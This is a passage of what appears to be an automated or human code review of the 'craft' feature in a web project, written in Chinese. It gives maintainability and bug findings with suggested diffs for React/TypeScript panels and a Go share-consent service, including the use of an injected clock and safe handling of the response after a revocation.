  ): WebVersionEvidenceFact | null {
+   let newestReady: WebVersionEvidenceFact | null = null;
+   for (const version of versions) {
+     if (!webCheckEvidenceReady(version.webEvidence)) continue;
+     if (newestReady === null || version.createdAt > newestReady.createdAt) newestReady = version;
+   }
+   return newestReady;
+ }


─── packages/views/src/craft/access.tsx:102-102 ───
[maintainability · low] 反馈段落同时输出 data-state={feedback.kind} 和 data-kind={feedback.kind} 两个值完全相同的属性，但
craft.css 中 .wk-craft-access-feedback 的样式选择器只消费
[data-kind='error'/'success']（craft.css:144-146），access.test.tsx 与 apps 层也没有任何对 data-state
的引用。同一状态有两个数据源属死属性，且与本项目其他 craft
组件（.wk-craft-chip[data-state=...]、.wk-craft-preview-state[data-state=...]）统一用 data-state
的惯例不一致，后续维护者容易改错一个。建议删掉未被引用的属性，或将 CSS 选择器统一到 data-state 并删除 data-kind，二选一保持单一来源。

-     {feedback && <p role={feedback.kind === 'error' ? 'alert' : 'status'} aria-live={feedback.kind === 'error' ? 'assertive' : 'polite'} aria-atomic="true" data-state={feedback.kind} className="wk-craft-access-feedback" data-kind={feedback.kind}>{feedback.message}</p>}
+     {feedback && <p role={feedback.kind === 'error' ? 'alert' : 'status'} aria-live={feedback.kind === 'error' ? 'assertive' : 'polite'} aria-atomic="true" className="wk-craft-access-feedback" data-kind={feedback.kind}>{feedback.message}</p>}


─── packages/views/src/craft/share.tsx:10-17 ───
[maintainability · low] @weknora/contracts 已冻结导出形状完全相同的
CraftShareDecision（web-artifact.ts:18：version_id/evidence_digest/owner_id/decision）与
CraftDecisionStatus（'approved' | 'rejected' | 'unknown'，与本地 CraftShareDecisionKind
逐值一致）。此处本地重复声明会与冻结契约发生静默漂移——同 lane 的 web-promotion.ts 遵循的是
NonNullable<CraftVersionView['web_evidence']> 从契约派生的模式。手写 fail-closed 解析（返回 null
而非抛错）保留是合理的，但类型应直接复用契约导出；同理 locale 可复用 presentation.ts 的 CraftLocale，expiresAt 展示可用既有 formatDateTime
而非渲染原始 ISO 串（兄弟组件 files.tsx/preview.tsx 均如此）。

- export type CraftShareDecisionKind = 'approved' | 'rejected' | 'unknown';
+ import type { CraftDecisionStatus, CraftShareDecision } from '@weknora/contracts';
  
- export interface CraftShareDecision {
-   version_id: string;
-   evidence_digest: string;
-   owner_id: string;
-   decision: CraftShareDecisionKind;
- }
+ export type CraftShareDecisionKind = CraftDecisionStatus;
+ export type CraftShareDecisionFact = CraftShareDecision; // 复用冻结契约类型，避免本地副本漂移


─── packages/views/src/craft/share.tsx:175-175 ───
[maintainability · medium] 面板使用的十余个 wk-craft-share-*
类名（wk-craft-share、-summary、-version、-digest、-state、-notice、-decision、-expiry、-awaiting、-error、-actio
ns、-confirm、-decline、-revoke）在全仓库任何 CSS 文件中均无定义——本变更同时交付的 craft.css 是该 lane 的指定样式表（其新增注释自述 "All
static styling lives here"），却只补齐了 wk-craft-access-* 系列。兄弟面板（sources.tsx 用 wk-craft-table、access.tsx
用 wk-craft-access-*）的类名均有样式，share 面板将成为唯一以浏览器默认样式交付的例外（span 无布局、按钮无间距、错误态无着色）。建议在 craft.css 中按既有
token 模式补齐 share 系列样式。

-   return <section aria-label={labels.heading} className="wk-craft-share" data-status={view.status} data-restricted={view.restricted}>
+ /* craft.css 中补充（示例） */
+ .wk-craft-share { border: 1px solid var(--craft-line); border-radius: 8px; background: var(--craft-surface); display: grid; gap: 0.6rem; padding: 0.75rem 0.9rem; }
+ .wk-craft-share-summary { display: flex; flex-wrap: wrap; gap: 0.5rem 1rem; margin: 0; }
+ .wk-craft-share-summary code { font-family: ui-monospace, monospace; font-size: 0.78rem; overflow-wrap: anywhere; }
+ .wk-craft-share-state[data-state='consented'] { color: var(--craft-success-text); }
+ .wk-craft-share-state[data-state='declined'] { color: var(--craft-danger); }
+ .wk-craft-share-actions { display: flex; gap: 0.5rem; flex-wrap: wrap; }
+ .wk-craft-share-error { border: 1px solid var(--craft-danger); border-radius: 8px; color: var(--craft-danger); padding: 0.6rem 0.8rem; margin: 0; }


─── packages/views/src/craft/share.tsx:149-149 ───
[maintainability · low] CraftSharePanel 与 projectShareView 目前唯一的消费方是 share.test.tsx：宿主 workbench.tsx
中没有任何 share 相关引用，本次变更的其余视图（access/sources/usage）也未导入。而服务端的 GET share / POST decision / POST
revocation 端点已随本变更交付（internal/handler/session/craft_share.go）。若后续 ticket 未接线，T11 的同意 UI
将整体不可达。需在合并前确认接线计划已排期，或在本变更中同步接入工作台。



─── packages/views/src/craft/sources.tsx:158-160 ───
[maintainability · low] 用类型谓词替代 `entry as CraftCitationFact` 断言：filter
之后编译器即可自动收窄，避免手写断言与联合类型后续演化脱节（例如新增第三种 kind 时断言仍会静默编译通过）。

    const citedIds = new Set<string>(
-     (props.citations ?? []).filter((entry) => entry.kind === 'fact').map((entry) => (entry as CraftCitationFact).citationId),
+     (props.citations ?? [])
+       .filter((entry): entry is CraftCitationFact => entry.kind === 'fact')
+       .map((entry) => entry.citationId),
    );


─── packages/views/src/craft/sources.tsx:250-250 ───
[maintainability · low] citations 列表使用 key={index}（inference 分支同样）：清单刷新/重排时会复用错位 DOM 与状态。fact 项有唯一
citationId 可作稳定 key；若同一 citationId 可能重复出现，可组合 `fact-${entry.citationId}-${index}` 保证唯一性，inference 项用
`inference-` 前缀区分。

-                 <li key={index} className="wk-craft-citation-fact" data-craft-citation={entry.citationId}>
+                 <li key={`fact-${entry.citationId}-${index}`} className="wk-craft-citation-fact" data-craft-citation={entry.citationId}>


─── packages/views/src/craft/usage.tsx:177-180 ───
[maintainability · low] CraftBudgetPauseNotice 将中文文案硬编码在组件内，而同文件的 CraftUsagePanel 已建立 strings
注入模式（CraftUsageStrings + CRAFT_USAGE_STRINGS_ZH 默认值），新组件绕过了该机制，后续做本地化/文案统一时会被遗漏。建议沿用同文件的 strings
prop 模式。另外按钮渲染了 canExtend 但 onRequestExtension 缺失时仅靠 disabled 兜底，建议在 canExtend 为 true
且无回调时直接不渲染按钮，语义更清晰。



─── internal/application/service/craft_share.go:403-405 ───
[maintainability · low] auditShare 的拒绝去重窗口起点与审计行 CreatedAt 直接使用 time.Now()，绕过了服务注入的 s.now()
时钟。CraftShareService 的其余时间判定（DecideShare/RevokeShare/ShareAuthority/view 的 TTL 判断）均走
s.now()，唯独审计路径使用墙钟，导致注入假时钟的测试无法确定性断言去重窗口行为（假时钟下写入的 CreatedAt 是真实时间，窗口比较失真）。同仓 T12 的平行实现
auditExport（craft_export.go:292-307）已经过 OCR 修正统一为 now := s.now()（见 docs/plans/craft-107-ocr-t12.md
的同款修正），此处应保持一致。

  	versionID = strings.TrimSpace(versionID)
+ 	now := s.now()
  	if outcome == "denied" {
- 		since := time.Now().Add(-craftDenyDedupWindow)
+ 		since := now.Add(-craftDenyDedupWindow)


─── internal/application/service/craft_share.go:417-418 ───
[maintainability · low] 审计行 CreatedAt 同样应使用注入时钟（与上面 since 的修正配套，对齐 craft_export.go:307 的 CreatedAt:
now 写法）。

  		TargetID: versionID, Outcome: outcome,
- 		Details: types.JSON(raw), CreatedAt: time.Now(),
+ 		Details: types.JSON(raw), CreatedAt: now,


─── internal/application/service/craft_share.go:332-334 ───
[bug · low] RevokeShare 在撤销已持久化提交(Updates 成功且审计已写)之后,才通过 s.view 重新派生响应视图。s.view 依赖 versions.Get +
files.GetFile + records.Load 三次读取,任一瞬时故障(如文件存储 5xx)或记录摘要损坏(Load 的 digest mismatch → ErrConflict →
409)都会让 RevokeShare 对一个已经生效的撤销返回错误响应。客户端会把非 2xx
理解为"撤销失败",但实际上同意已被撤销——对撤回同意这一安全敏感操作,不应把已提交的状态变更报成失败(虽然重试幂等、方向上是保守的,但仍会误导调用方)。建议与 DecideShare
的响应组装方式对齐:在更新前先派生 contribution(fail-closed),更新成功后用 decision 行在本地投影响应,避免提交后再做远程读取。

+ 	versionID = strings.TrimSpace(versionID)
+ 	// Derive the contribution BEFORE the row update so a revocation that
+ 	// commits is never reported through a post-commit evidence re-read.
+ 	contribution, err := s.contribution(ctx, scope, versionID)
+ 	if err != nil {
+ 		return CraftShareView{}, err
+ 	}
+ 	now := s.now()
+ 	result := s.db.WithContext(ctx).
+ 		Where("tenant_id = ? AND session_id = ? AND version_id = ? AND revoked_at IS NULL", scope.TenantID, scope.SessionID, versionID).
+ 		Updates(&craftShareDecisionRow{RevokedAt: &now, UpdatedAt: now})
+ 	if result.Error != nil {
+ 		return CraftShareView{}, result.Error
+ 	}
+ 	if result.RowsAffected > 0 {
+ 		s.auditShare(ctx, scope, versionID, "craft.share_revoked", "success", nil)
+ 	}
  	// No live row (never decided, or already revoked): revocation is
- 	// idempotent and the view simply reports the resulting state.
- 	return s.view(ctx, scope, versionID)
+ 	// idempotent; project the resulting state from the row just read.
+ 	decision, err := s.decision(ctx, scope, versionID)
+ 	if err != nil {
+ 		return CraftShareView{}, err
+ 	}
+ 	return projectCraftShareView(contribution, decision, s.now()), nil

